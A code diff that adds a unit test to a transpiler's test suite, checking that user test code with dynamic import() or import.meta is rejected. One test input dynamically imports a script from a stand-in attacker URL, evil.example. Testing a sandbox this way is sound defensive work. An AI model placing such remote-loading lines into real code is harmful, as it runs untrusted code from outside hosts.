@@ -247,6 +247,17 @@ for (const c of cases) test('case ' + c.out, () => eq(median(c.input), c.out as 
     expect(r.error).toMatch(/^line 2: import\/export statements are not supported/);
     expect(transpileUserCode('export const y = 2;').error).toMatch(/^line 1: /);
   });
+
+  it('rejects dynamic import() and import.meta (same AST walk as the candidate check)', () => {
+    const r = transpileUserCode("test('t', () => {\n  eq(1, 1);\n  void import('https://evil.example/x.js');\n});");
+    expect(r).toEqual({ js: '', error: 'line 3: dynamic import is not allowed in tests or properties' });
+    expect(transpileUserCode("property('p', [fc.nat()], () => !!import.meta.url);").error).toBe(
+      'line 1: import.meta is not allowed in tests or properties',
+    );
+    // the word in strings, comments and property names is fine
+    const ok = transpileUserCode("// import('x')\ntest('import(1)', () => eq({ import: 1 }.import, 1));");
+    expect(ok.error).toBeUndefined();
+  });
 });
 
 describe('compileCandidate with spec.typeDecls', () => {
